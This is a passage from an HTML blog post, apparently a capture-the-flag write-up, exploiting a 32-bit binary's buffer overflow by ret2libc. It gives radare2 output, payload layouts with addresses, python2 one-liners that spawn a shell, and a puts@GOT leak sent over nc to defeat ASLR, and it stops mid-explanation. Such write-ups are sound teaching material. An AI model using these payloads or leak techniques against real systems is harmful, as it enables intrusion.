&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xffffd1f0  &lt;span class=&#34;m&#34;&gt;5886&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0408&lt;/span&gt; 00a0 &lt;span class=&#34;m&#34;&gt;0408&lt;/span&gt; 08d2 ffff            X...........
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x0804853c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our input starts &lt;code&gt;0x2c&lt;/code&gt; before, so this is the amount of padding we need to provide and, then, the return address of the function we want to execute (&lt;code&gt;system&lt;/code&gt; in this case). In addition, thanks to deactivating ASLR, &lt;code&gt;libc&lt;/code&gt; will be loaded in the same base address during multiple executions (&lt;code&gt;0xf7dd4000&lt;/code&gt; in the example):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x0804853c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; dmm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x0804853c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; ood
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PTRACE_CONT: No such process
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;child received signal &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Process with PID &lt;span class=&#34;m&#34;&gt;2337&lt;/span&gt; started...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; attach &lt;span class=&#34;m&#34;&gt;2337&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2337&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;File dbg:///home/urzu/247ctf/pwn/non_executable_stack  reopened in read-write mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2337&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd50b0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; dc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter the secret password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kk
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Incorrect secret password!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd3069&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; dmm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7fd3069&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, our payload would look something like this (dummy address is explained a bit below):&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x2c padding] + [system address] + [dummy address] + [/bin/sh address]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can obtain the function RVA with the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ rabin2 -s /usr/lib32/libc-2.28.so &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -w system
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1525&lt;/span&gt;  0x0003e9e0 0x0003e9e0 WEAK   FUNC   &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;        system
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the string offset (like a RVA) inside the library thanks to:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ strings -t x /usr/lib32/libc-2.28.so &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;17eaaa /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we already know that &lt;code&gt;libc&lt;/code&gt; will be loaded in &lt;code&gt;0xf7dd4000&lt;/code&gt; address, we can add those RVA to the base address to obtain the following payload:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x2c padding] + [0xf7e129e0] + [dummy address] + [0xf7f52aaa]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can check that we effectively calculate the absolute address right with radare2:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7f3b000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; dmi libc system
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt;   0x0012a2c0 0xf7efe2c0 GLOBAL FUNC   &lt;span class=&#34;m&#34;&gt;102&lt;/span&gt;       svcerr_systemerr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;658&lt;/span&gt;   0x0003e9e0 0xf7e129e0 GLOBAL FUNC   &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;        __libc_system
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1525&lt;/span&gt;  0x0003e9e0 0xf7e129e0 WEAK   FUNC   &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt;        system
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7f3b000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; / /bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Searching &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; bytes in &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xf7f3b000-0xf7fab000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hits: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xf7f52aaa hit5_0 .b/strtod_l.c-c/bin/shexit 0canonica.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we try our exploit, we can effectively obtain an interactive shell (the cat command is to maintain program stdin open and feed non_executable_stack with our commands):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;python2 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;print(&amp;#34;A&amp;#34;*0x2c + &amp;#34;\xe0\x29\xe1\xf7&amp;#34; + &amp;#34;A&amp;#34;*4 + &amp;#34;\xaa\x2a\xf5\xf7&amp;#34;)&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cat&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ./non_executable_stack    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter the secret password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Incorrect secret password!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;urzu
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;stack-frame&#34;&gt;Stack frame&lt;/h3&gt;
&lt;p&gt;So, why do we need a dummy address between our function call and the parameter? This is due how stack frame are constructed during function calls. We&amp;rsquo;ll see it with a simple C example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Hello World!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Okay, so if we analyze the compiled binary (&lt;code&gt;gcc -o test.out -m32 -no-pie test.c&lt;/code&gt;) with radare2, well see that the parameter &lt;code&gt;&amp;quot;Hello World!&amp;quot;&lt;/code&gt; is passed into the stack at line &lt;code&gt;0x08049184&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;│           0x0804917e      8d9008e0ffff   lea edx, [eax - 0x1ff8]
│           0x08049184      52             push edx
│           0x08049185      89c3           mov ebx, eax
│           0x08049187      e8a4feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804918c      83c410         add esp, 0x10
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After executing &lt;code&gt;0x08049184&lt;/code&gt;, the stack looks like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       ...       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;-----------------&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; @&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello World!&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;-----------------&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       ...       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, the function call at &lt;code&gt;0x08049187&lt;/code&gt; will push the return address into the stack, so after the &lt;code&gt;puts&lt;/code&gt;function ends doing its magic, the execution flow of our program will continue as nothing happened. This means that when &lt;code&gt;puts&lt;/code&gt; starts to execute, it will see the stack as this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|       ...       |
|-----------------|
|    0x0804918c   | &amp;lt;--- return address of the caller
|-----------------|
| @&amp;#34;Hello World!&amp;#34; |
|-----------------|
|       ...       |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This return address is exactly our dummy address from our payload. So, in our payload, after the shell finished executing, the binary will probably crash as the program will change execution flow to &lt;code&gt;0x41414141&lt;/code&gt; and very likely nothing valid is there. Therefore, we can change our dummy address with the address of exit function (calculated the same way that &lt;code&gt;system&lt;/code&gt; function above) to produce a clean exit of the program:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x2c padding] + [0xf7e129e0] + [0xf7e03a60] + [0xf7f52aaa]
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;remote-exploit&#34;&gt;Remote exploit&lt;/h2&gt;
&lt;p&gt;Well, now we know how to exploit the binary locally, but we need to consider two aspects to exploit it in the server:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need to assume that ASLR will be activated.&lt;/li&gt;
&lt;li&gt;We don&amp;rsquo;t know which version of &lt;code&gt;libc&lt;/code&gt; is installed.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In order to overcome the two limitations, we can use a &lt;code&gt;libc&lt;/code&gt; function leakage.&lt;/p&gt;
&lt;h3 id=&#34;plt-and-got&#34;&gt;PLT and GOT&lt;/h3&gt;
&lt;p&gt;You can read more in detail in &lt;a href=&#34;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this blog&lt;/a&gt;, but we only need to know the general idea. When a dynamic linked binary is using an external function (like &lt;code&gt;libc&lt;/code&gt; &lt;code&gt;puts&lt;/code&gt;), your code can&amp;rsquo;t reference an absolute address of the library because this will change after each execution (due to ASLR) and it won&amp;rsquo;t be portable (diferrent version of &lt;code&gt;libc&lt;/code&gt; will have that function in different locations).&lt;/p&gt;
&lt;p&gt;So, to overcome this issue, your code reference to another section within your binary, the Procedure Linkage Table (PLT). This section is responsible to either trigger linker resolution of target function (due to &lt;a href=&#34;http://www.qnx.com/developers/docs/qnxcar2/index.jsp?topic=%2Fcom.qnx.doc.neutrino.prog%2Ftopic%2Fdevel_Lazy_binding.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;lazy binding&lt;/a&gt;) or jump to the target function if it was already resolved. The later is stored in the Global Offset Table (GOT) section, which is the actual table of offsets as filled in by the linker for external symbols.&lt;/p&gt;
&lt;p&gt;You can see how &lt;code&gt;non_executable_stack&lt;/code&gt; reference to the PLT in the code:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;[0x080484d6]&amp;gt; pdf
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
[... redacted ...]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we see the content of that address, we can see that there is another jump:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;[0x080484d6]&amp;gt; s sym.imp.puts
[0x08048390]&amp;gt; pd 1
            ; CALL XREFS from sym.chall @ 0x804851b, 0x804852f
            ; CALL XREF from main @ 0x8048577
┌ 6: int sym.imp.puts (const char *s);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└           0x08048390      ff2518a00408   jmp dword [reloc.puts]      ; 0x804a018
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we go to that address, we&amp;rsquo;ll see that there is another reference to the binary itself, this is the PLT stub responsible to resolve the address of the external symbol, so puts haven&amp;rsquo;t been invoked yet:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;[0x08048390]&amp;gt; s reloc.puts
[0x0804a018]&amp;gt; pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0x08048396                          ; RELOC 32 puts
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we continue execution to force &lt;code&gt;puts&lt;/code&gt; resolution, now we can see that now the GOT is pointing to the actual offset in memory:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;[0x0804a018]&amp;gt; dc
Enter the secret password:
kk
Incorrect secret password!
[0xf7fd3069]&amp;gt; s -
[0x0804a018]&amp;gt; pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0xf7e3b0a0                          ; RELOC 32 puts
[0x0804a018]&amp;gt; dmi libc puts
[... redacted ...]
458   0x000690a0 0xf7e3b0a0 WEAK   FUNC   416       puts
[... redacted ...]
[0x0804a018]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;libc-leakage&#34;&gt;&lt;code&gt;libc&lt;/code&gt; leakage&lt;/h3&gt;
&lt;p&gt;With all of this in mind, we can construct our payload the same way as before, but instead to reference the absolute address of the functions, we can use address of the PLT known functions. We can use this technique only because the binary isn&amp;rsquo;t a &lt;a href=&#34;https://en.wikipedia.org/wiki/Position-independent_code&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Position Independent Executable (PIE)&lt;/a&gt; and we can reference the absolute value of the PLT as we know where the binary will be mapped during execution (base address &lt;code&gt;0x8048000&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;So, in this case, our payload will be like this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x2c padding] + [puts@plt] + [dummy address] + [puts@got]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time, we&amp;rsquo;re calling the &lt;code&gt;puts@plt&lt;/code&gt; at &lt;code&gt;0x08048390&lt;/code&gt; with the &lt;code&gt;puts@got&lt;/code&gt; at &lt;code&gt;0x0804a018&lt;/code&gt; as parameter (which it&amp;rsquo;ll be send to us as a string):&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x2c padding] + [0x08048390] + [dummy address] + [0x0804a018]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we try our newly crafted payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python2 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;print(&amp;#34;A&amp;#34;*0x2c + &amp;#34;\x90\x83\x04\x08&amp;#34; + &amp;#34;A&amp;#34;*4 + &amp;#34;\x18\xa0\x04\x08&amp;#34;)&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc ad520e503a0ec4e0.247ctf.com &lt;span class=&#34;m&#34;&gt;50341&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xxd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000: 456e &lt;span class=&#34;m&#34;&gt;7465&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7220&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7468&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6520&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7365&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6372&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6574&lt;/span&gt;  Enter the secret
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000010: &lt;span class=&#34;m&#34;&gt;2070&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6173&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7377&lt;/span&gt; 6f72 643a 0a49 6e63 6f72   password:.Incor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000020: &lt;span class=&#34;m&#34;&gt;7265&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6374&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2073&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6563&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7265&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7420&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7061&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7373&lt;/span&gt;  rect secret pass
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000030: 776f &lt;span class=&#34;m&#34;&gt;7264&lt;/span&gt; 210a 60d3 dbf7 90ed d6f7 0a    word!.&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;........
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, now we know that &lt;code&gt;puts&lt;/code&gt; in the server is placed at &lt;code&gt;0xf7dbd360&lt;/code&gt; address. With this information, we can search a &lt;a href=&#34;https://libc.blukat.me/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;libc database&lt;/a&gt; to download this specific version (&lt;code&gt;libc6-i386_2.27-3ubuntu1_amd64&lt;/code&gt;). In case that address matches different versions, we can leak other addresses as &lt;code&gt;gets&lt;/code&gt; or &lt;code&gt;strcmp&lt;/code&gt; to limit the results.&lt;/p&gt;
&lt;p&gt;















&lt;figure  &gt;
  &lt;div class=&#34;d-flex justify-content-center&#34;&gt;
    &lt;div class=&#34;w-100&#34; &gt;&lt;img alt=&#34;libc database result&#34; srcset=&#34;
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_92f850fdc407dbf60aaa066543a0d4b6.webp 400w,
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_f621dcae6367362fcabcc7c2e680d8ae.webp 760w,
               /post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_1200x1200_fit_q75_h2_lanczos_3.webp 1200w&#34;
               src=&#34;https://duroz.github.io/post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_92f850fdc407dbf60aaa066543a0d4b6.webp&#34;
               width=&#34;760&#34;
               height=&#34;204&#34;
               loading=&#34;lazy&#34; data-zoomable /&gt;&lt;/div&gt;
  &lt;/div&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;If we run again our Python command with the payload, we&amp;rsquo;ll see that this time &lt;code&gt;puts&lt;/code&gt; address is different, so we can confirm that the remote server has ALSR activated.&lt;/p&gt;
&lt;h3 id=&#34;payload-construction&#34;&gt;Payload construction&lt;/h3&gt;
&lt;p&gt;The main problem here is that we need to know the base address of the &lt;code&gt;libc&lt;/code&gt; library to construct our payload. We can obtain it thanks to the &lt;code&gt;puts&lt;/code&gt; address leakage:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[libc base adddress] = [puts address leaked] - [libc6-i386_2.27-3ubuntu1_amd64.puts RVA]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But if we provide a dummy address to the payload, the remote program will crash, and in the next execution the base address will be different. So, we can provide the &lt;code&gt;main&lt;/code&gt; address to continue execution and interact again with the program and the vulnerable gets function to overwrite again the return address, this time with the first payload we described earlier, but instead of referencing the absolute addresses, we can use them as:&lt;/p&gt;
